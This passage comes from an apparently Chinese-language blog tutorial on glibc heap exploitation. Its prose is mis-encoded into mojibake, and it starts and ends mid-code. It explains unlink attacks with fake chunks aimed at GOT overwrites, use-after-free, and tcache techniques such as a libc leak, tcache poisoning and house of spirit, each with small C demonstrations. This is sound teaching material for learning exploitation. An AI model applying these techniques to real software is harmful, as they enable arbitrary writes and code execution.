<span class="hljs-comment">//å ä½å—</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡freeåçš„å †ç»“æ„å¦‚ä¸‹</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb2.png"></p><p>å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹å <code>free(ptr4)</code> å¯ä»¥å‘ç° chunk è¢«åˆå¹¶äº†</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb3.png"></p><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>unlink æœºåˆ¶çš„å­˜åœ¨æ˜¯ä¸ºäº†é˜²æ­¢å†…å­˜è¿‡åº¦ç¢ç‰‡åŒ–ã€‚å½“ä¸€ä¸ª chunk è¢«é‡Šæ”¾æ—¶ï¼Œè¯¥ chunk é fastbin æˆ– tcache bin ï¼Œlibc å°±ä¼šæ£€æŸ¥è¯¥å †å—å‰åæ˜¯å¦æœ‰ chunk å±äºè¢«é‡Šæ”¾çš„çŠ¶æ€ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±ä¼šå°†ä»–ä»¬ä» bin ä¸­å–å‡ºè¿›è¡Œåˆå¹¶ï¼Œå³ä½¿è¿™äº›å‰åçš„å †å—æ˜¯åœ¨ fast bin æˆ–è€… tcache bin ä¸­ã€‚</p><h3 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>unlink çš„è¿‡ç¨‹å°±ç±»ä¼¼äºæŠŠåŒå‘é“¾è¡¨ä¸­é—´çš„ç©ºé—² chunk å–å‡ºæ¥ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p><p>æœ€åˆ bin ä¸­çš„å †å—åƒæœ€ä¸Šå›¾é‚£æ ·é“¾æ¥ï¼ŒP æ˜¯æˆ‘ä»¬é‡Šæ”¾çš„å †å—ï¼Œ BK æ˜¯ P å¯¹åº”é“¾è¡¨å‰æ–¹çš„å †å—ï¼Œ FD æ˜¯åé¢çš„å †å—ã€‚unlink ç»“æŸåå°±å˜æˆäº†æœ€ä¸‹å›¾ï¼Œæ­¤æ—¶p åœ¨ FD çš„ data ä¸­ï¼Œç„¶å BK å’Œ FD ç›´æ¥ç›¸è¿ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink_intro.png"></p><p>æˆ‘ä»¬å…ˆä»å·²ç»è¢«æ·˜æ±°çš„é˜²æŠ¤æ—¶çš„ unlink å¼€å§‹å­¦ä¹ å…¶åŸç†</p><h5 id="è¢«æ·˜æ±°çš„-unlink"><a href="#è¢«æ·˜æ±°çš„-unlink" class="headerlink" title="è¢«æ·˜æ±°çš„ unlink"></a>è¢«æ·˜æ±°çš„ unlink</h5><p>æˆ‘ä»¬å‡è®¾å †å†…çš„ç»“æ„å¦‚ä»¥ä¸‹å·¦å›¾ï¼Œç°åœ¨æœ‰ç‰©ç†ç©ºé—´è¿ç»­çš„ä¸¤ä¸ª chunkï¼ˆQï¼ŒNextchunkï¼‰ï¼Œå…¶ä¸­ Q å¤„äºä½¿ç”¨çŠ¶æ€ã€Nextchunk å¤„äºé‡Šæ”¾çŠ¶æ€ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/old_unlink_vul.png"></p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬é€šè¿‡æŸç§æ–¹å¼ï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰å°† Nextchunk çš„ fd å’Œ bk æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å®šçš„å€¼ã€‚åˆ™å½“æˆ‘ä»¬ free(Q) æ—¶ï¼Œä¼šä¾æ¬¡è¿›è¡Œä¸‹é¢çš„æ“ä½œï¼š</p><ul><li>glibc åˆ¤æ–­è¿™ä¸ªå—å±äº small chunk</li><li>åˆ¤æ–­æ˜¯å¦éœ€è¦å‘å‰åˆå¹¶ï¼Œå‘ç°å‰ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œä¸éœ€è¦å‘å‰åˆå¹¶</li><li>åˆ¤æ–­æ˜¯å¦éœ€è¦å‘ååˆå¹¶ï¼Œåä¸€ä¸ª chunk ç©ºé—²ï¼Œéœ€è¦åˆå¹¶</li><li>è¿›è¡Œ unlink æ“ä½œ</li></ul><p> unlink å…·ä½“æ‰§è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š</p><ul><li><p><code>FD = P-&gt;fd = target addr - 12</code>  ï¼Œå³å°† <em>FD</em> å­—æ®µèµ‹å€¼ä¸ºå †å— P çš„ <em>fd</em> å­—æ®µæ‰€å­˜å‚¨çš„æ•°æ® target addr - 12 </p></li><li><p><code>BK = P-&gt;bk = expect value</code> ï¼Œå³å°† <em>BK</em> å­—æ®µèµ‹å€¼ä¸ºå †å— P çš„ <em>bk</em> å­—æ®µæ‰€å­˜å‚¨çš„æ•°æ® expect value ï¼ˆæˆ‘ä»¬é¢„æœŸæ”¹å†™çš„æ•°æ®ï¼‰ã€‚</p></li><li><p><code>FD-&gt;bk = BK</code> ï¼Œå³å°† <em>target addr - 12 + 12</em> å¤„çš„å†…å®¹ï¼ˆ target addr æœ¬èº«ï¼‰è®¾ç½®ä¸º expect valueã€‚</p></li><li><p><code>BK-&gt;fd = FD</code>ï¼Œå³å°† <em>expect value + 8</em> å¤„çš„å†…å®¹è®¾ç½®ä¸º target addr - 12ã€‚</p></li></ul><p>åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦ç¡®ä¿ expect value + 8 å¤„çš„åœ°å€å…·æœ‰å¯å†™çš„æƒé™ï¼Œå¦åˆ™å¯èƒ½æ— æ³•æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚</p><p>æˆåŠŸæ‰§è¡Œ unlink æ¼æ´åˆ©ç”¨åï¼Œä¼šå°†ç›®æ ‡åœ°å€å¤„çš„å€¼è®¾ç½®ä¸ºæˆ‘ä»¬é¢„æœŸçš„å†…å®¹ï¼Œä»è€Œå®ç°ä»»æ„åœ°å€å†™æ“ä½œã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥å°†æŸä¸ª GOT è¡¨é¡¹æŒ‡å‘ç³»ç»Ÿå‡½æ•°æˆ–è€…æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°ï¼Œä»è€ŒåŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œexpect value + 8 å¤„çš„å€¼ä¹Ÿä¼šè¢«ç ´åï¼Œå¯èƒ½ä¼šå½±å“ç¨‹åºçš„æ­£å¸¸æ‰§è¡Œï¼Œå› æ­¤åœ¨åˆ©ç”¨æ¼æ´æ—¶éœ€è¦ä»”ç»†è€ƒè™‘å’Œå¤„ç†è¿™äº›å½±å“ã€‚</p><h3 id="å½“å‰çš„-unlink"><a href="#å½“å‰çš„-unlink" class="headerlink" title="å½“å‰çš„ unlink"></a>å½“å‰çš„ unlink</h3><p>å“ˆå“ˆå“ˆï¼Œæ€ä¹ˆä¼šè¿™ä¹ˆç®€å•å‘¢ğŸ¤ª</p><p>ç°åœ¨çš„ unlink å®ç°ä¹‹å‰ä¼šå¯¹ chunk çš„ size å’ŒåŒå‘é“¾è¡¨è¿›è¡Œæ£€æŸ¥ ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// æ£€æŸ¥ P çš„å¤§å°æ˜¯å¦ä¸å…¶ç›¸é‚»å †å—çš„ prev_size å­—æ®µä¸€è‡´ï¼ˆsizeæ£€æŸ¥ï¼‰</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// æ£€æŸ¥ P çš„ fd å’Œ bk æŒ‡é’ˆæ˜¯å¦ä¸å…¶å‰ååŒå‘é“¾è¡¨èŠ‚ç‚¹çš„æŒ‡é’ˆä¸€è‡´ï¼ˆåŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ï¼‰</span><br><span class="hljs-keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>&#125;<br><br><span class="hljs-comment">// åœ¨ largebin ä¸­ï¼Œæ£€æŸ¥ P çš„ next_size æŒ‡é’ˆæ˜¯å¦ä¸å…¶å‰ååŒå‘é“¾è¡¨èŠ‚ç‚¹çš„æŒ‡é’ˆä¸€è‡´ï¼ˆåŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ï¼‰</span><br><span class="hljs-keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P || P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­å°±æœ‰å¯¹ fd å’Œ bk çš„æ£€æŸ¥ã€‚è€Œä¸Šé¢çš„æƒ…å†µä¸­ï¼Œå°±ä¼šè¢«æ£€æŸ¥å‡ºæ¥ï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨è¿™ç§æ–¹æ³•ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¼ªé€ å †å—æ¥ç»•è¿‡æ£€æŸ¥ğŸ˜ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªå…¬å¼ï¼š</p><ol><li>P -&gt; fd -&gt; bk &#x3D;&#x3D; P &lt;&#x3D;&gt; *( P -&gt; fd + 0x18 ) &#x3D;&#x3D; P</li><li>p -&gt; bk -&gt; fd &#x3D;&#x3D; P &lt;&#x3D;&gt; *( p -&gt; bk + 0x10 ) &#x3D;&#x3D; P</li></ol><p>ç®€å•ç‚¹è¯´å°±æ˜¯ï¼š</p><ol><li><strong>P -&gt; fd &#x3D; &amp; P - 0x18</strong></li><li><strong>P -&gt; bk &#x3D; &amp; P - 0x10</strong></li></ol><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink.png"></p><p>è§¦å‘unlinkåPå¤„çš„æŒ‡é’ˆä¼šå˜ä¸º P-0x18 ã€‚</p><p>å¦‚æœå°†ä¸Šé¢è¯´çš„På˜ä¸ºæˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„åœ°å€æ¯”å¦‚ä¿å­˜æŒ‡é’ˆçš„æ•°ç»„åœ°å€ï¼Œåˆ©ç”¨ä¸Šé¢è¯´åˆ°çš„ unlink å°±èƒ½æ§åˆ¶æ•°ç»„ä¸­çš„æŒ‡é’ˆï¼Œå¹¶ä¸”æˆ‘ä»¬ä½¿æŒ‡é’ˆä¿å­˜ç±»ä¼¼ free_gotã€puts_got ç­‰ï¼Œä¹‹åæˆ‘ä»¬ä¿®æ”¹æŒ‡é’ˆä½¿å…¶ä¸º system_got ï¼Œé‚£ä¹ˆä¸‹æ¬¡æˆ‘ä»¬è°ƒç”¨å…¶ä»–å‡½æ•°å°±ä¼šè°ƒç”¨ systemï¼ˆï¼‰ã€‚</p><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>Use After Free å°±æ˜¯å†…å­˜å—è¢«é‡Šæ”¾ä»¥åå†æ¬¡è¢«åˆ©ç”¨ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</p><ul><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULLï¼Œå†æ¬¡åˆ©ç”¨æ—¶ç¨‹åºå°±ä¼šå´©æºƒ</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œè€Œä¸”ç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆç¨‹åºå¯ä»¥æ­£å¸¸è¿è½¬ã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚</li></ul><p>æˆ‘ä»¬ä¸€èˆ¬æ‰€æŒ‡çš„ Use After Free æ¼æ´ä¸»è¦æ˜¯åä¸¤ç§ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL çš„å†…å­˜æŒ‡é’ˆä¸º dangling pointer ï¼ˆå®ƒçš„ä¸­æ–‡ç¿»è¯‘å«è¿·é€”æŒ‡é’ˆğŸ˜Šï¼‰ã€‚</p><p>å®ƒçš„å®é™…åº”ç”¨å°±æ˜¯æˆ‘ä»¬åœ¨åƒæ˜¯ chunk extend é‡Œé¢ç”¨åˆ°çš„ç¤ºä¾‹2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;  <span class="hljs-comment">// Use After Free</span><br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><blockquote><p>è¿™ä¸€éƒ¨åˆ†æˆ‘çš„ç¯å¢ƒæ˜¯Ubuntu18 libc2.27</p></blockquote><h3 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h3><p>Tcache å…¨åä¸º Thread Local Cachingï¼Œåœ¨ libc2.26 ä¹‹åæ‰å‡ºç°ã€‚å®ƒä¸ºæ¯ä¸ªçº¿ç¨‹åˆ›å»ºä¸€ä¸ªç¼“å­˜ï¼Œé‡Œé¢åŒ…å«äº†ä¸€äº›å°å †å—ã€‚</p><p>Tcache bin æ˜¯å•é“¾è¡¨çš„æ•°æ®ç»“æ„ï¼Œå­˜å‚¨ç›¸åŒå¤§å°çš„ç©ºé—²å †å—ï¼Œsizeå¤§å°èŒƒå›´æ˜¯ 0x20-0x410ï¼Œå…è®¸å­˜æ”¾çš„ chunk æ•°ä¸º7ã€‚å½“ä½ ä½¿ç”¨ <code>free()</code> å‡½æ•°é‡Šæ”¾ä¸€ä¸ªå †å—æ—¶ï¼Œglibc ä¼šå°†è¯¥å †å—æ”¾å…¥é€‚å½“å¤§å°ç±»åˆ«çš„ Tcache bin ä¸­ï¼Œä»¥å¤‡åç»­å†æ¬¡åˆ†é…ã€‚Tcache bin é‡‡ç”¨å…ˆè¿›åå‡ºçš„ç­–ç•¥ï¼Œä¸” prev_inuse ä½ä¸ä¼šè¢«åˆå¹¶ï¼Œä¹Ÿå°±æ˜¯è¯´ tcache bin ä¸­çš„ chunk ä¸ä¼šè¢«åˆå¹¶ã€‚</p><h3 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h3><p>åœ¨æœ‰äº† tcache æœºåˆ¶ä»¥åï¼Œæ— è®ºæ˜¯åˆ†é…è¿˜æ˜¯é‡Šæ”¾å †å—ï¼Œtcache éƒ½æ˜¯é¦–å…ˆè¢«åˆ©ç”¨çš„ï¼Œç›´åˆ°è¾¾åˆ°æ¯ä¸€ä¸­ bin çš„ä¸Šé™ 7 ä¸ºæ­¢ã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µå°±æ˜¯ fast bin æˆ–è€… small bin è¿”å›äº†ä¸€ä¸ªå †å—ï¼Œä¸” tcache å¯¹åº”å¤§å°çš„ bin ä¸­æœªæ»¡çš„è¯ï¼Œé‚£ä¹ˆè¯¥fast bin æˆ–è€… samll bin é“¾ä¸­çš„å †å—ä¼šè¢«åŠ å…¥åˆ°å¯¹åº” tcache bin ä¸­ç›´è‡³å…¶ä¸Šé™ã€‚</p><h4 id="ç»•è¿‡-Tcache"><a href="#ç»•è¿‡-Tcache" class="headerlink" title="ç»•è¿‡ Tcache"></a>ç»•è¿‡ Tcache</h4><p>Tcache æœºåˆ¶æ— éå°±æ˜¯å¢åŠ äº†ä¸€å±‚ç¼“å­˜ï¼Œç»•è¿‡ Tcache å°±æ˜¯æˆ‘ä»¬æ‰‹åŠ¨æ„é€ å¡«å……å †å—å¡«æ»¡æŸä¸€ä¸ªå¤§å°å¯¹åº”çš„ thcache bin é“¾è¡¨ï¼Œä½¿å¾—åœ¨å†æ¬¡å›æ”¶çš„ bin è¿›å…¥unsorted bin æˆ–è€… small binï¼Œlarge bin ç­‰ç­‰ï¼Œå†åˆ©ç”¨è¿™äº› bin å¾—åˆ° libc åŸºå€ã€‚</p><p>åŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr[<span class="hljs-number">7</span>];<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><span class="hljs-comment">// ç”³è¯·7ä¸ªï¼Œé‡Šæ”¾7ä¸ªï¼Œå¡«æ»¡tcache bin[0x90]</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        ptr[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        <span class="hljs-built_in">free</span>(ptr[i]);<br>    <span class="hljs-comment">// è¿™é‡Œå†é‡Šæ”¾aï¼Œå°±ä¼šæ”¾å…¥åˆ°unsorted binä¸­</span><br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc addr is %llx\n&quot;</span>,  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/thcache-bypass.png"></p><p>å¦‚ä¸Šæˆ‘ä»¬å°±æ³„éœ²å‡ºäº† main_arena çš„åœ°å€ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥é€šè¿‡ret2libcæ—¶ç”¨åˆ°çš„å¥—è·¯æ³„éœ²libcåŸºå€è¿›è€Œè°ƒç”¨ç›®æ ‡å‡½æ•°å•¦ã€‚</p><h4 id="åˆ†é…å †åˆ°æŒ‡å®šçš„åœ°å€"><a href="#åˆ†é…å †åˆ°æŒ‡å®šçš„åœ°å€" class="headerlink" title="åˆ†é…å †åˆ°æŒ‡å®šçš„åœ°å€"></a>åˆ†é…å †åˆ°æŒ‡å®šçš„åœ°å€</h4><p>åœ¨å †çš„åˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šéœ€è¦æŠŠå †çš„æŒ‡é’ˆåˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°å€ä¸Šå»ï¼Œæ¯”å¦‚BSSæ®µæˆ–è€…ç›´æ¥æŒ‡å‘æ ˆç©ºé—´å®ç°ç¨‹åºæµçš„æ“æ§ï¼ŒæŠ‘æˆ–æ˜¯å°†å †å—é‡æ–°åˆ†é…ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹æ³•å®ç°ï¼š</p><h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h5><p>tcache poisoningçš„åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li><p>åˆ†é…ä¸€ä¸ªç›®æ ‡å¤§å°çš„å †å—ï¼Œå†å°†å…¶é‡Šæ”¾</p></li><li><p>åˆ©ç”¨å †æº¢å‡ºç­‰æ¼æ´ï¼Œå°†åˆšåˆšé‡Šæ”¾çš„å †å—çš„æŸä¸ªæŒ‡é’ˆï¼ˆä¾‹å¦‚ <code>fd</code> æˆ– <code>bk</code> ï¼‰ä¿®æ”¹ä¸ºæˆ‘ä»¬å¯æ§çš„åœ°å€æŒ‡é’ˆï¼ˆå¦‚ <code>__free_hook </code>æˆ– <code>__malloc_hook</code> ç­‰å±€éƒ¨å˜é‡çš„åœ°å€ï¼‰ã€‚</p></li><li><p>å†æ¬¡å»ºç«‹ç›¸åŒå¤§å°çš„å †å—å¹¶é‡Šæ”¾ï¼Œè¿™æ ·è¯¥å †å—çš„å†…å®¹ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ tcache é“¾è¡¨èŠ‚ç‚¹ã€‚</p></li><li><p>å†æ¬¡å»ºç«‹ç›¸åŒå¤§å°çš„å †å—ï¼Œæ­¤æ—¶ tcache ä¼šå°†ä¹‹å‰å¡«å……çš„ç›®æ ‡æŒ‡é’ˆåœ°å€ä½œä¸ºè¿”å›å€¼è¿”å›ç»™è°ƒç”¨è€…ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™æ®µåœ°å€å†…å†™å…¥æ”»å‡»ä»£ç ï¼Œç¨‹åºæ‰§è¡Œåˆ°ç›®æ ‡åœ°å€ï¼Œå°±å¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><blockquote><p>å› ä¸º fd æŒ‡é’ˆä¼šè¿”å›ç©ºé—²å †å—åœ°å€ç»™ç¨‹åºï¼Œè€Œè¿™ä¸ªåœ°å€è¢«æˆ‘ä»¬æ›¿æ¢æˆäº†ç›®æ ‡åœ°å€ï¼Œæ‰€ä»¥å®é™…ä¸Šè¿”å›å€¼æ˜¯ç›®æ ‡åœ°</p></blockquote></li></ul><p> åŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> localVariables ;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;localVariables addr is %p\n&quot;</span>, &amp;localVariables);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr addr is %p\n&quot;</span>, ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-comment">// åªéœ€ä¿®æ”¹fdæŒ‡é’ˆï¼Œç”³è¯·çš„å¤§å°å’Œå½“å‰tcache binå¤§å°ç›¸åŒå³å¯</span><br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)&amp;localVariables;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the second malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachePoisoning.png"></p><h5 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h5><p>tcache house of spirit è¿™ç§åˆ©ç”¨æ–¹å¼æ˜¯ç”±äº tcache_put() å‡½æ•°æ£€æŸ¥ä¸ä¸¥æ ¼å¯¼è‡´çš„ï¼Œåœ¨é‡Šæ”¾çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥è¢«é‡Šæ”¾çš„æŒ‡é’ˆæ˜¯å¦çœŸçš„æ˜¯å †å—çš„ malloc æŒ‡é’ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª fake_chunk æ¥è·³è½¬åˆ°ç›®æ ‡åœ°å€ã€‚</p><p>åˆ©ç”¨æ€è·¯æ˜¯ä¼ªé€ ä¸€ä¸ª size ç¬¦åˆ tcache bin size çš„ fake_chunk ï¼Œä½¿ç¨‹åºåœ¨é‡Šæ”¾æ—¶è¯¯ä»¥ä¸ºä»–ä»¬å±äº tcache çš„ç®¡ç†èŒƒå›´ï¼Œå°±å®ç°äº†ä»»æ„åœ°å€çš„ç›®çš„çš„ã€‚</p><p>åŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 